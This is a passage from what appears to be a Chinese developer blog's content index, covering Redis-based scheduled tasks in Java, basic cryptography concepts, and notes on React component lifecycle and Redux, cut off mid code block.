class=\"line\">        jedis.zadd(_KEY, Instant.now().plusSeconds(<span class=\"number\">45</span>).getEpochSecond(), <span class=\"string\">&quot;function2&quot;</span>);</span><br><span class=\"line\">        jedis.zadd(_KEY, Instant.now().plusSeconds(<span class=\"number\">14</span>).getEpochSecond(), <span class=\"string\">&quot;function2&quot;</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;current time is &quot;</span> + <span class=\"keyword\">new</span> Date());</span><br><span class=\"line\">        doDelayQueue(jedis);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">doDelayQueue</span><span class=\"params\">(Jedis jedis)</span> <span class=\"keyword\">throws</span> InterruptedException </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"keyword\">true</span>) &#123;</span><br><span class=\"line\">            Instant nowInstant = Instant.now();</span><br><span class=\"line\">            <span class=\"keyword\">long</span> lastSecond = nowInstant.plusSeconds(-<span class=\"number\">1</span>).getEpochSecond(); <span class=\"comment\">// 上一秒时间</span></span><br><span class=\"line\">            <span class=\"keyword\">long</span> nowSecond = nowInstant.getEpochSecond();</span><br><span class=\"line\">            Set&lt;String&gt; data = jedis.zrangeByScore(_KEY, lastSecond, nowSecond);</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (String item: data) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//consume data, and start a task</span></span><br><span class=\"line\">                <span class=\"keyword\">new</span> Thread(()-&gt;&#123;</span><br><span class=\"line\">                    System.out.println(<span class=\"string\">&quot;start a task, invoke function [&quot;</span> + item + <span class=\"string\">&quot;] at &quot;</span> + <span class=\"keyword\">new</span> Date());</span><br><span class=\"line\">                &#125;).start();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// remove task</span></span><br><span class=\"line\">            jedis.zremrangeByScore(_KEY, lastSecond, nowSecond);</span><br><span class=\"line\">            TimeUnit.SECONDS.sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n输出如下：<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">current time is Fri Apr 16 13:58:40 CST 2021</span><br><span class=\"line\">start a task, invoke function [function1] at Fri Apr 16 13:58:51 CST 2021</span><br><span class=\"line\">start a task, invoke function [function3] at Fri Apr 16 13:58:54 CST 2021</span><br><span class=\"line\">start a task, invoke function [function2] at Fri Apr 16 13:59:25 CST 2021</span><br></pre></td></tr></table></figure>\n定时任务创建服务和定时任务执行服务可以彼此成为独立的进程，使用Redis通信。创建者只需要把定时任务写入Redis，执行者轮询消费Zset中的数据，并创建任务。</li>\n</ol>\n<ol>\n<li>键空间通知<br>我们可以通过Redis的键空间通知来实现定时任务，它的实现思路是给所有的定时任务设置一个过期时间，等到了过期之后，我们通过订阅过期消息就能感知到定时任务需要被执行了，此时我们执行定时任务即可。</li>\n</ol>\n<p>默认情况下Redis是不开启键空间通知的，需要我们通过<code>config set notify-keyspace-events Ex</code>的命令手动开启，<br>或者取消<code>redis.conf</code>中<code>notify-keyspace-events Ex</code>的注解后重启Redis。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#  Example 2: to get the stream of the expired keys subscribing to channel</span><br><span class=\"line\">#             name __keyevent@0__:expired use:</span><br><span class=\"line\">#</span><br><span class=\"line\">notify-keyspace-events Ex</span><br></pre></td></tr></table></figure></p>\n<p>开启之后定时任务的代码如下：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RedisKeyExpireScheduleDemo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String _TOPIC = <span class=\"string\">&quot;__keyevent@0__:expired&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> Jedis jedis = <span class=\"keyword\">new</span> Jedis(<span class=\"string\">&quot;localhost&quot;</span>,<span class=\"number\">6379</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 订阅过期消息</span></span><br><span class=\"line\">        jedis.psubscribe(<span class=\"keyword\">new</span> JedisPubSub() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onPMessage</span><span class=\"params\">(String pattern, String channel, String message)</span> </span>&#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;invoke function [&quot;</span> + message + <span class=\"string\">&quot;] at &quot;</span> + <span class=\"keyword\">new</span> Date());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;, _TOPIC);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>Redis中输入<code>set function1 0</code>，<code>expire function1 10</code>，就创建了一个10秒后执行<code>function1</code>的任务。</p>\n<p>控制台输出如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">invoke function [function1] at Fri Apr 16 14:15:12 CST 2021</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>参考资料：</p>\n<ul>\n<li><a href=\"https://www.bejson.com/othertools/cron/\">cron在线工具</a></li>\n<li><a href=\"https://www.jb51.net/article/155453.htm\">Timer和ScheduledExecutorService实现</a></li>\n<li><a href=\"https://blog.csdn.net/pan_junbiao/article/details/109556822\">Spring中集成Quartz</a></li>\n</ul>\n</blockquote>\n","tags":["Java"]},{"title":"密码学原理","url":"/2018/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8E%9F%E7%90%86/","content":"<p>密码学能做什么?</p>\n<ul>\n<li>机密性：如何使得某个数据自己看得懂，别人看不懂</li>\n<li>认证：如何确保数据的正确来源，如何保证通信实体的真实性</li>\n<li>完整性：如何确保数据在传输过程中没有删改</li>\n<li>不可否认性：如何确保用户行为的不可否认性</li>\n</ul>\n<p>Kerckhoffs假设：假定密码分析者和敌手知道所使用的密码系统，即密码体制的安全性仅仅依赖于<strong>对密钥的保密</strong>，而不应依赖对算法的保密。<br><span id=\"more\"></span></p>\n<p>密码体制的攻击：</p>\n<ul>\n<li>穷举密钥 -&gt; 增大密钥数量</li>\n<li>统计分析攻击：通过分析密文和明文规律来破译 -&gt; 设法使明文密文统计规律不一样</li>\n<li>解决密变换攻击：针对加密变换的数学基础，通过数学求解设法找到解密变换 -选用有坚实数学基础的算法</li>\n</ul>\n<p>密码安全的准则：</p>\n<ul>\n<li>破译密文的代价超过了被加密的价值</li>\n<li>破译密文的时间超过了信息的有用期</li>\n</ul>\n<h1 id=\"古典密码\"><a href=\"#古典密码\" class=\"headerlink\" title=\"古典密码\"></a>古典密码</h1><ol>\n<li><p>置换密码(permutation)</p>\n<ul>\n<li>只对字符和字符组做位置的移动</li>\n<li>本质上内容只是顺序变了</li>\n<li>例子：500B.C.斯巴达天书</li>\n</ul>\n</li>\n<li><p>代替密码(Substitution)</p>\n<ul>\n<li>代替密码构造字母表，用表中字符代替明文字符，字符相对位置不不变，其本身值变了</li>\n<li>单表代替密码：加法，乘法%26,仿射密码</li>\n<li>多表代换密码</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"流密码学\"><a href=\"#流密码学\" class=\"headerlink\" title=\"流密码学\"></a>流密码学</h2><h3 id=\"一次一密\"><a href=\"#一次一密\" class=\"headerlink\" title=\"一次一密\"></a>一次一密</h3><ul>\n<li><code>y = x&amp;k</code>;</li>\n<li>优点：密钥随机产生，仅用一次，无条件安全，加密解密效率极高（二进制流按位与）</li>\n<li>缺点：密钥和明文必须一样长，共享困难，不实用。<h3 id=\"流密码定义\"><a href=\"#流密码定义\" class=\"headerlink\" title=\"流密码定义\"></a>流密码定义</h3><h3 id=\"同步流密码\"><a href=\"#同步流密码\" class=\"headerlink\" title=\"同步流密码\"></a>同步流密码</h3></li>\n</ul>\n<h1 id=\"分组密码\"><a href=\"#分组密码\" class=\"headerlink\" title=\"分组密码\"></a>分组密码</h1><p>用于构造伪随机数生成器，流密码，消息认证码和杂凑函数，消息认证技术，数据完整性测试，数据完整性机制，实体认证协议以及单钥数字签名体制的核心组成部分。</p>\n<p>要求：安全性，运行速度，存储量</p>\n<p>既可以硬件实现，也可以软件实现</p>\n<p>明文序列：</p>\n<script type=\"math/tex; mode=display\">x_0,x_1...,x_{n-1}..</script><p>分组为n，加密函数：</p>\n<script type=\"math/tex; mode=display\">E:V_n * K->V_m</script><p>密文长度分组为m，这种加密实际上是字长为n的数字序列的代换密码。通常取n=m，即明文和密文分组相等，若n &lt; m, 则为有数据扩展的分组密码，若n &gt; m,则为有数据压缩的分组密码。</p>\n<ol>\n<li><p>混淆原则(Confusion)：<br>将密文，明文，密钥三者之间的统计关系和代数关系变的尽可能复杂，使得敌手即使获得了密文和明文，也无法求出密钥的任何信息；即使获得了明文和密文的统计规律，也无法求出明文的新信息。即<strong>明文/密钥不能由少许的密钥比特代数的或统计的表示出来</strong></p>\n</li>\n<li><p>散射原则(diffusion):<br>应将明文的统计规律和结构规律散射到相当长的一段统计中去，也就是让明文中的每一位影响密文中尽可能多的位，或者说让密文中的每一位都受到明文中尽可能多的位的影响。</p>\n</li>\n</ol>\n<p>分组密码应该满足的原则</p>\n<ul>\n<li>分组长度n应该足够大：防止穷举攻击法奏效</li>\n<li>密钥量要足够大：尽可能消除弱密钥并使所有密钥同等好，使穷举密钥攻击失效</li>\n<li>由密钥确定的置换算法要足够复杂，充分实现明文和密钥的扩散和混淆</li>\n<li>加密和解密算法要简单，让计算机软件高速实现</li>\n</ul>\n","tags":["密码学"]},{"title":"对React学习的一点深入","url":"/2019/11/22/%E5%AF%B9react%E5%AD%A6%E4%B9%A0%E7%9A%84%E4%B8%80%E7%82%B9%E6%B7%B1%E5%85%A5/","content":"<p>之前在react官网上囫囵吞枣学了react的一点基础知识，就急不可耐的写了很多代码（人脸识别，云笔记，实训的医院管理系统前端。。。），结果遇到了很多坑。react是一门很复杂的技术，而我缺乏系统的学习，正好看到一本《深入浅出react和redux》的电子书，借此深入学习react。</p>\n<h2 id=\"props和state\"><a href=\"#props和state\" class=\"headerlink\" title=\"props和state\"></a>props和state</h2><p>react天然具有高内聚，低耦合的特征（样式，内容，交互内封装一个组件中）。<code>props</code>看作外部的接口，<code>state</code>看作自己的内部状态，两者改变都会导致组件的重新渲染。react组件开发应合理划分组件的边界，将高内聚（交互频繁）的部分合并为一个组件，组件和组件中间保证低耦合（低信息交换）</p>\n<h2 id=\"props类型约束与初始化\"><a href=\"#props类型约束与初始化\" class=\"headerlink\" title=\"props类型约束与初始化\"></a>props类型约束与初始化</h2><p>假设一个组件名字是Counter（计数器），有string类型的<code>caption</code>，number类型的<code>initValue</code>，其中<code>caption</code>必须被申明，且必须是string类型，<code>initValue</code>必须是number类型，需要有默认值。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Counter</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//.... Counter组建的定义</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/* Counter的props类型约束 */</span></span><br><span class=\"line\">Counter.propTypes = &#123;</span><br><span class=\"line\">  <span class=\"attr\">caption</span>: PropTypes.string.isRequired,</span><br><span class=\"line\">  <span class=\"attr\">initValue</span>: PropTypes.number,</span><br><span class=\"line\">  <span class=\"attr\">onUpdate</span>: PropTypes.func</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/* Counter的props初始化 */</span></span><br><span class=\"line\">Counter.defaultProps = &#123;</span><br><span class=\"line\">  <span class=\"attr\">initValue</span>: <span class=\"number\">0</span> <span class=\"comment\">//如果没有声明，初始化为0</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果违背了约束条件，则会在console中产生warning，有效避免了调试找bug的困难。</p>\n<span id=\"more\"></span>\n<h2 id=\"显式调用setState\"><a href=\"#显式调用setState\" class=\"headerlink\" title=\"显式调用setState\"></a>显式调用setState</h2><p>如果直接对<code>state.variable</code>操作，不会重新渲染组件，但也会影响到<code>state</code>，并报warning，而<code>setState()</code>不仅会改变<code>state</code>的状态，还会驱动组件的重新渲染。</p>\n<h2 id=\"react组件类的装载过程\"><a href=\"#react组件类的装载过程\" class=\"headerlink\" title=\"react组件类的装载过程\"></a>react组件类的装载过程</h2><p><code>constructor()</code>-&gt;<code>getInitialState()</code>-&gt;<code>getDefaultProps()</code>-&gt;<code>componentWillMount()</code>-&gt;<code>render()</code>-&gt;<code>componentDidMount()</code></p>\n<h3 id=\"constructor-NaN\"><a href=\"#constructor-NaN\" class=\"headerlink\" title=\"constructor\"></a>constructor</h3><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Counter</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\">props</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>(props) <span class=\"comment\">//如果有构造函数，第一行一定要是调用超类方法，否则无法访问props</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.state.count = props.initValue </span><br><span class=\"line\">    <span class=\"built_in\">this</span>.onClickIncreaseButton = <span class=\"built_in\">this</span>.onClickIncreaseButton.bind(<span class=\"built_in\">this</span>)</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    bind操作符，另一种NB的写法：</span></span><br><span class=\"line\"><span class=\"comment\">    this.onClickIncreaseButton = ::this.onClickIncreaseButton</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>构造函数一般有两个目的：</p>\n<ul>\n<li>初始化<code>state</code>，没有状态的组件不需要<code>state</code>，也不需要重载构造函数，而有状态的组件，最好在构造函数中统一对<code>state</code>初始化</li>\n<li>绑定<code>this</code>，因为ES6下类的成员函数在执行时的<code>this</code>不是和类实例自动绑定的，构造函数中，<code>this</code>就是当前组建实例，所以为了方便将来的调用，往往在构造函数中对实例的函数绑定<code>this</code>为当前实例。</li>\n</ul>\n<h3 id=\"getInitialState-getDefaultProps\"><a href=\"#getInitialState-getDefaultProps\" class=\"headerlink\" title=\"getInitialState/getDefaultProps\"></a>getInitialState/getDefaultProps</h3><p>这是一种已经废弃的写法，只会执行一次，用于在使用<code>React.createClass()</code>时候初始化<code>state</code>和<code>props</code>。因为这种创建class的方法已经被废弃，所以这种方法也不会再使用。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> Counter = React.createClass(&#123;</span><br><span class=\"line\">  <span class=\"attr\">getInitialState</span>: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;<span class=\"attr\">count</span>: <span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">getDefaultProps</span>: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;<span class=\"attr\">initValue</span>: <span class=\"number\">0</span>&#125;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>这是等价的老式写法。</p>\n<h3 id=\"render\"><a href=\"#render\" class=\"headerlink\" title=\"render\"></a>render</h3><p><code>render()</code>是一个<strong>无副作用</strong>的<strong>纯函数</strong>，用于返回jsx，没有默认实现，且必须被实现，如果不想渲染任何DOM，可以返回<code>null</code>。因为无副作用，所以不能在这个函数中调用<code>setState()</code></p>\n<h3 id=\"componentWillMount-componentDidMount\"><a href=\"#componentWillMount-componentDidMount\" class=\"headerlink\" title=\"componentWillMount/componentDidMount\"></a>componentWillMount/componentDidMount</h3><p>装载过程中，<code>componentWillMount()</code>会在调用<code>render()</code>函数之前被调用，<code>componentDidMount()</code>会在调用<code>render()</code>函数之后被调用，这两个函数就像是<code>render()</code>函数的前哨和后卫，一前一后，把<code>render()</code>函数夹住，正好分别做<code>render</code>前后必要的工作。</p>\n<p>由于<code>componentWillMount()</code>执行时<code>render()</code>已经执行，所以调用<code>setState()</code>也没有意义，需要预处理的东西可以放到<code>constructor()</code>中，所以这个函数没有什么用。</p>\n<p><code>render()</code>只是个返回jsx对象的函数，不执行之际的渲染，所以<code>render()</code>执行后不会立刻执行该组件的<code>componentDidMount()</code>,等同级的组件<code>render()</code>都执行完了，react会分析DOM的改变，执行重新渲染，完毕后，才会依次执行<code>componentDidMount()</code>。</p>\n<p>因为这个方法执行的时候，DOM已经渲染完毕所以可以做两件事：</p>\n<ul>\n<li>此时可以进行和服务器的通信（ajax请求）。</li>\n<li>此时可以使用其他js库（jquery）</li>\n</ul>\n<p><code>componentWillMount()</code>可以在服务器端被调用，也可以在浏览器端被调用；而<code>componentDidMount()</code>只能在浏览器端被调用，在服务器端使用React的时候不会被调用。</p>\n<h2 id=\"react组件类的更新过程\"><a href=\"#react组件类的更新过程\" class=\"headerlink\" title=\"react组件类的更新过程\"></a>react组件类的更新过程</h2><p>当<code>props</code>或<code>state</code>更新时，就会触发react的更新过程。</p>\n<p><code>componentWillReceiveProps()</code>-&gt;<code>shouldComponentUpdate()</code>-&gt;<code>componentWillUpdate()</code>-&gt;<code>render()</code>-&gt;<code>componentDidUpdate()</code></p>\n<h3 id=\"componentWillReceiveProps-nextProps\"><a href=\"#componentWillReceiveProps-nextProps\" class=\"headerlink\" title=\"componentWillReceiveProps(nextProps)\"></a>componentWillReceiveProps(nextProps)</h3><p>只要是父组件的 <code>render()</code>函数被调用，在<code>render()</code>函数里面被渲染的子组件就会经历更新过程。通过<code>this.setState()</code>方法触发的更新过程不会调用这个函数（因为这个函数适合根据新的<code>props</code>值，也就是参数<code>nextProps</code>，来计算出是不是要更新内部状态<code>state</code>，父的<code>props</code>改变会触发子的<code>state</code>的隐式改变，而这会产生死循环）</p>\n<p>每个React组件都可以通过<code>this.forceUpdate()</code>强行引发一次重新绘制。</p>\n<h3 id=\"shouldComponentUpdate-nextProps-nextState\"><a href=\"#shouldComponentUpdate-nextProps-nextState\" class=\"headerlink\" title=\"shouldComponentUpdate(nextProps,nextState)\"></a>shouldComponentUpdate(nextProps,nextState)</h3><p><code>render()</code>函数决定了该渲染什么，而<code>shouldComponentUpdate()</code>决定了一个组件什么时候不需要渲染。这两个函数是唯二需要返回值的react生命周期函数。<code>shouldComponentUpdate()</code>返回boolean类型决定是否需要更新。这个函数和react性能息息相关，默认返回true，每次要重新渲染，但是想提高性能，则需要定制这个函数。<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"title\">shouldComponentUpdate</span>(<span class=\"params\">nextProps, nextState</span>)</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (nextProps.caption !== <span class=\"built_in\">this</span>.props.caption) ||(nextState.count !== <span class=\"built_in\">this</span>.state.count);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>现在，只有当<code>caption</code>改变，或者<code>state</code>中的<code>count</code>值改变，<code>shouldComponent</code>才会返回true。</p>\n<p>如果组件的<code>shouldComponentUpdate()</code>函数返回true，React接下来就会依次<br>调用对应组件的<code>componentWillUpdate()</code>，<code>render()</code>和<code>componentDidUpdate()</code>函数。</p>\n<p>和装载过程不同的是，当在服务器端使用React渲染时，这一对函数中的Did函数，也就是<code>componentDidUpdate()</code>，并不是只在浏览器端才执行的，无论更新过程发生在服务器端还是浏览器端，该函数都会被调用。</p>\n<p>当React组件被更新时，原有的内容被重新绘制，这时候就需要在<code>componentDidUpdate()</code>再次调用jQuery代码。</p>\n<h2 id=\"react组件类的卸载过程\"><a href=\"#react组件类的卸载过程\" class=\"headerlink\" title=\"react组件类的卸载过程\"></a>react组件类的卸载过程</h2><h3 id=\"componentWillUnmount\"><a href=\"#componentWillUnmount\" class=\"headerlink\" title=\"componentWillUnmount\"></a>componentWillUnmount</h3><p>React组件的卸载过程只涉及一个函数<code>componentWillUnmount()</code>，当React组件要从DOM树上删除掉之前，对应的<code>componentWillUnmount()</code>函数会被调用，所以这个函数适合做一些清理性的工作。一般要把<code>componentWillMount()</code>中创建的一些DOM元素处理掉，防止内存泄露。</p>\n<h2 id=\"组件通信\"><a href=\"#组件通信\" class=\"headerlink\" title=\"组件通信\"></a>组件通信</h2><p>父组件改变子组件的状态，通过绑定子组件的<code>props</code>在自己的<code>state</code>上，改变自己的<code>state</code>。</p>\n<p>子组件向父组件传递信息，子组件调用父组件绑在其<code>props</code>上的父方法：<br><figure class=\"highlight jsx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Counter</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//...</span></span><br><span class=\"line\">  onUpdate = <span class=\"function\">(<span class=\"params\">newValue</span>)=&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.props.onUpdate(newValue)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CounterPanel</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//...</span></span><br><span class=\"line\">  render = <span class=\"function\">()=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">        <span class=\"tag\">&lt;<span class=\"name\">Counter</span> <span class=\"attr\">onUpdate</span>=<span class=\"string\">&#123;this.onUpdate&#125;</span> <span class=\"attr\">caption</span>=<span class=\"string\">&quot;first&quot;</span>/&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">        <span class=\"tag\">&lt;<span class=\"name\">Counter</span> <span class=\"attr\">onUpdate</span>=<span class=\"string\">&#123;this.onUpdate&#125;</span> <span class=\"attr\">caption</span>=<span class=\"string\">&quot;second&quot;</span>/&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">        <span class=\"tag\">&lt;<span class=\"name\">Counter</span> <span class=\"attr\">onUpdate</span>=<span class=\"string\">&#123;this.onUpdate&#125;</span> <span class=\"attr\">caption</span>=<span class=\"string\">&quot;third&quot;</span>/&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">      <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  onUpdate = (newValue)&#123;</span><br><span class=\"line\">    <span class=\"comment\">//收到子组件的调用</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>父组件向子组件传递信息，调用子组件的方法，通过绑定rel：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Counter</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//...</span></span><br><span class=\"line\">  <span class=\"title\">constructor</span>(<span class=\"params\">props</span>)=&gt;&#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>(props)</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.props.bind(<span class=\"built_in\">this</span>)<span class=\"comment\">//绑定子组件的引用到父组件的成员变量中</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">invokedMethod</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//...子组件 被调用的方法</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CounterPanel</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//...</span></span><br><span class=\"line\">  counter1 = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  render = <span class=\"function\">()=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">        <span class=\"tag\">&lt;<span class=\"name\">Counter</span> <span class=\"attr\">bind</span>=<span class=\"string\">&#123;(rel)</span>=&gt;</span>&#123;this.counter1 = rel&#125;&#125;/&gt;</span></span><br><span class=\"line\"><span class=\"xml\">      <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  invokerMethod = <span class=\"function\">()=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">this</span>.counter1) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.counter1.invokedMethod()<span class=\"comment\">//父组件通过子组件的句柄调用子组件</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>同级组件通信可以通过公共父组件通信（状态提升）。</p>\n<p>当组件都有<code>state</code>，会造成数据的冗余，例如三个计数器Counter各自保有<code>num</code>，CounterPanel有三者的<code>num</code>的和，一旦有个组建有bug，就会出现数据的不一致。所以，需要有一个领头羊作为标准，其他的组件和他保持一致（不保有<code>state</code>）。为了解决这种“多个领头羊”的问题，把数据放到全局空间统一管理，这就是redux和flux的store的概念。</p>\n<p>同时多层组件要通信则需要借助中间层传递<code>props</code>，这造成了数据的冗余，违反了低耦合的要求。</p>\n<h2 id=\"单向数据流框架的始祖Flux和一个更强实现Redux\"><a href=\"#单向数据流框架的始祖Flux和一个更强实现Redux\" class=\"headerlink\" title=\"单向数据流框架的始祖Flux和一个更强实现Redux\"></a>单向数据流框架的始祖Flux和一个更强实现Redux</h2><p>Redux是管理应用状态的框架，</p>\n<p>////////////////<br>redux:<br>store只能有一个，存状态<br>reducer必须是纯函数，深拷贝，不能执行ajax<br>ActionType单独管理Action的类型<br>ActionCreator（工厂模式）单独管理Action<br>XXX中import XXXUI 写事件<br>XXXUI中export const 直接返回一个无状态的render函数：(props)=&gt;(&lt;&gt;..&lt;&gt;)，便于ui<br>逻辑分离，而且无状态组件性能更优</p>\n<p>redux中间件，和redux、 devtools同步使用（增强函数）<br>redux-thunk<br>redux-saga</p>\n<p>react-redux:<br>react-redux!=redux,redux是一个相对独立的数据管理框架，redux和react-redux是两个独立的npm包，react-redux要依赖redux，使用时两个都需要手动安装？yarn似乎可以直接关联依赖。</p>\n<p>import {Provider , connect} from ‘react-redux’<br>提供器，包裹要使用的组件；连接器，需要定义状态影射函数stateToProps，可以将UI模块的全部state改变为props，从而去状态化,定义事件影射函数dispatchToProps,不需要再组建内bind方法的this，所有的事件为OnXXX = this.props.xxx。最后export  default connect(stateToProps,dispatchToProps)(XXUI)</p>\n<p>好习惯：<br>解构函数和属性数据<br>在render的第一行<br>const {xxx} = this.props;//方法和数据</p>\n<p>react router</p>\n<p>react hooks</p>\n<h2 id=\"ReactRouter\"><a href=\"#ReactRouter\" class=\"headerlink\" title=\"ReactRouter\"></a>ReactRouter</h2><figure class=\"highlight jsx\"><table><tr><td class=\"code\"><pre><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; BrowserRouter, Route, Link&#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react-router-dom&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;Page1,Page2,Page3&#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;../page/&#x27;</span><span class=\"string\">&#x27;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">class GlobalRouter extends React.Component &#123;</span></span><br><span class=\"line\"><span class=\"string\">  render() &#123;</span></span><br><span class=\"line\"><span class=\"string\">      return (</span></span><br><span 